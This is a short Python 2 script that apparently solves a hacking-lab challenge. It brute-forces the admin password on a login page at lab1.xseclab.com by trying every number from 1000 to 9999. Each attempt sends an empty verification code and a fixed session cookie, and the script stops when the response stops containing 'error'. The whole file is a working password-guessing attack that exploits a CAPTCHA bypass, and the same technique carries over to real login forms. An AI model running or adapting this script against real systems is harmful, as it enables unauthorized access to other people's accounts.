#--coding:utf-8
import requests

s=requests.Session()
url='http://lab1.xseclab.com/vcode3_9d1ea7ad52ad93c04a837e0808b17097/login.php'
for i in range(1000,10000):
    data={'username':'admin','pwd':i,'vcode':''}
    #headers={'cookie':'saeut=61.155.86.68.1441934993580140; PHPSESSID=05c4327338eed465a49da6541020abf7'}
    cookies={'saeut':'61.155.86.68.1441934993580140','PHPSESSID':'05c4327338eed465a49da6541020abf7'}
    res=s.post(url,data=data,cookies=cookies)
    if 'error' not in res.text:
        print 'password is:'+str(i)
        print res.content
        break
